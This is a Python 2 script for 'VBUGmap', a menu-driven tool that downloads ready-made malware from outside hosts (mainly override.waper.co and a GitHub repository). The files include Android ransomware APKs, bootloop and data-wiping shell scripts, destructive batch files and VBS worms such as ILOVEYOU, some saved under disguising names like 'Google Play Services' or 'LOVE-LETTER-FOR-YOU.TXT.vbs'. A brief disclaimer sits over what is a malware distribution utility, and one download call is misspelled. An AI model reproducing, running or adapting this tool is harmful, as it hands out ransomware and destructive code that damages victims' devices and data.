#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
VBUGmap v1.0
Author: Dark_Shadow04
Date: 12-12-2017 (04:26)
Github: https://github.com/DarkShadow04
Blog: https://arfortech.wordpress.com/
Hackenforce (Hackenforce & arfortech collaboration)
"""
import os, sys, urllib

#--- Color  ---#
N = '\033[0m'    # Normal
Y = '\033[1;33m' # Yellow
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
D = '\033[1;9;31m'  # DelBold
#---        ---#

def __banner__():
	print "%s      _                              %s" % (Y,N)
	print "%s _ _ | |_  _ _  ___  _____  ___  ___  %s{%sK41TO#dev%s}%s" % (Y,W,Y,W,N)
	print "%s| | || . || | || . ||     || .'|| . |%s" % (Y,N)
	print "%s \_/ |___||___||_  ||_|_|_||__,||  _|%s" % (Y,N)
	print "%s               |___|            |_|  %s" % (Y,N)

def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
__banner__()
print
print "%splease do %snot%s%s use in military or secret service organizations, or for illegal purposes.\n%s" % (W,D,N,W,N)

command='%s*>%s' % (W,N)
if os.geteuid()==0:
	command='%s#>%s' % (W,N)

help=('''%s
VBugmap Menu
	help     - get help menu.
	clear    - clearscreen.
	vbug_apk - get list of downloadable apk virus files.
	vbug_sh  - get list of downloadable sh virus files.
	vbug_bat - get list of downloadable bat virus files.
	vbug_vbs - get list of downloadable vbs virus files.
	credits  - you should also thank them.
	restart  - restart program.
	exit     - close program.
%s''' % (W,N))
credits=('''%s
Credits
	Thanks to Syahrul Nizam for helping me collect the virus
	Thanks to Mila for a stack of very cool viruses (Mila@contagiodump.com)
	Thanks to M Julius as you also help search for virus file
	Thanks for those who all have been waiting for the release of this tool for a long time
	Thanks for Wahyu Hidayat for giving permission to use his artificial virus
	And thanks to you too for having run our program
%s''' % (W,N))
list_apk=('''%s
App for Android
	(01) Wanna Decryptor 1
	(02) Ransomware Legacy
	(03) Wanna Decryptor 2
	(04) GoogleKernel
	(05) AndroRW
	(06) Elite
	(07) AndroGrave
	(08) Ransomware Rans
	(09) Google Play Services
	(10) rfrfrfr
%s''' % (W,N))
list_sh=('''%s
Shell for Android
	(01) Ransomware
	(02) Bootloop
	(03) Data-Eater
	(04) freeze
	(05) zipbomb
%s''' % (W,N))
list_bat=('''%s
Batch for PC
	(01) R.I.P
	(02) KOCE
	(03) Reg-Eater
	(04) 404
	(05) CMD
%s''' % (W,N))
list_vbs=('''%s
Visual Basic for PC
	(01) ILOVEYOU
	(02) alay
	(03) Capslock
	(04) Jelek
%s''' % (W,N))

opt=True
while opt:
	vbugmap = raw_input('\033[1mvbugmap\033[0m' + command + ' ')
	if vbugmap.strip() in 'help'.split():
		print help
	elif vbugmap.strip() in 'vbug_apk'.split():
		print list_apk
		apkfile=raw_input("vbugmap*> select ")
		if apkfile.strip() in "01 1".split():
			urllib.urlretrieve("http://override.waper.co/files/wannacrypt.apk", 'WannaDecryptor.apk')
		elif apkfile.strip() in "02 2".split():
			urllib.urlretrieve("http://override.waper.co/files/legacy.apk", 'Legacy.apk')
		elif apkfile.strip() in "03 3".split():
			urllib.urlretrieve("http://override.waper.co/files/wannacryptx2.apk", 'WannaDecryptorx2.apk')
		elif apkfile.strip() in "04 4".split():
			urllib.urlretrieve("http://override.waper.co/files/googlekern.apk", 'GoogleKernel.apk')
		elif apkfile.strip() in "05 5".split():
			urllib.urlretrieve("http://override.waper.co/files/androrw.apk", 'AndroRW.apk')
		elif apkfile.strip() in "06 6".split():
			urllib.urlretrieve("http://override.waper.co/files/31337.apk", 'Elite.apk')
		elif apkfile.strip() in "07 7".split():
			urllib.urlretrieve("http://override.waper.co/files/andrograve.apk", 'AndroGrave.apk')
		elif apkfile.strip() in "08 8".split():
			urllib.urlretrieve("http://override.waper.co/files/ranselbag.apk", 'Rans.apk')
		elif apkfile.strip() in "09 9".split():
			urllib.urlretrieve("http://override.waper.co/files/dupe.zip", 'GPS.apk')
		elif apkfile.strip() in "10".split():
			urllib.urlretrieve("http://override.waper.co/files/b55db82cd4b45d3d6c0b9c86896431.apk", 'rfrfrfr.apk')
		else:
			print "%s[!] ERROR: Wrong Input...%s" % (R,N)
	elif vbugmap.strip() in 'vbug_sh'.split():
		print list_sh
		shfile=raw_input("vbugmap*> select ")
		if shfile.strip() in "01 1".split():
			urllib.urlretrieve("https://github.com/JA1D3V/AndroidRansomware/archive/master.zip", 'AndroidRansomware.zip')
		elif shfile.strip() in "02 2".split():
			urllib.urlretrieve("http://override.waper.co/files/bootloop.apk", 'bootloop.sh')
		elif shfile.strip() in "03 3".split():
			urllib.urlretrieve("http://override.waper.co/files/dateater.apk", 'data-eater.sh')
		elif shfile.strip() in "04 4".split():
			urllib.urlretrieve("http://override.waper.co/files/freeze.apk", 'freeze.sh')
		elif shfile.strip() in "05 5".split():
			urllib.urlretrieve("http://override.waper.co/files/zipbombsh.apk", 'zipbomb.sh')
		else:
			print "%s[!] ERROR: Wrong Input...%s" % (R,N)
	elif vbugmap.strip() in 'vbug_bat'.split():
		print list_bat
		batfile=raw_input("vbugmap*> select ")
		if batfile.strip() in "01 1".split():
			urllib.retrieve("http://override.waper.co/files/rip.apk", 'RIP.bat')
		elif batfile.strip() in "02 2".split():
			urllib.urlretrieve("http://override.waper.co/files/koce.apk", 'koce.bat')
		elif batfile.strip() in "03 3".split():
			urllib.urlretrieve("http://override.waper.co/files/regeater.apk", 'reg-eater.bat')
		elif batfile.strip() in "04 4".split():
			urllib.urlretrieve("http://override.waper.co/files/404.apk", '404.bat')
		elif batfile.strip() in "05 5".split():
			urllib.urlretrieve("http://override.waper.co/files/cmd.apk", 'CMD.bat')
		else:
			print "%s[!] ERROR: Wrong Input...%s" % (R,N)
	elif vbugmap.strip() in 'vbug_vbs'.split():
		print list_vbs
		vbsfile=raw_input("vbugmap*> select ")
		if vbsfile.strip() in "01 1".split():
			urllib.urlretrieve("http://override.waper.co/files/iloveyou.apk", 'LOVE-LETTER-FOR-YOU.TXT.vbs')
		elif vbsfile.strip() in "02 2".split():
			urllib.urlretrieve("http://override.waper.co/files/alay.apk", 'alay.vbs')
		elif vbsfile.strip() in "03 3".split():
			urllib.urlretrieve("http://override.waper.co/files/capslock.apk", 'CapsLock.vbs')
		elif vbsfile.strip() in "04 4".split():
			urllib.urlretrieve("http://override.waper.co/files/jelek.apk", 'jelek.vbs')
		else:
			print "%s[!] ERROR: Wrong Input...%s" % (R,N)
	elif vbugmap.strip() in 'credits'.split():
		print credits
	elif vbugmap.strip() in 'clear'.split():
		if sys.platform == "linux2":
			os.system("clear")
		elif sys.platform == "win32":
			os.system("cls")
		else:
			os.system("clear")
	elif vbugmap.strip() in 'restart'.split():
		restart_program()
	elif vbugmap.strip() in 'exit'.split():
		print(N)
		opt=False
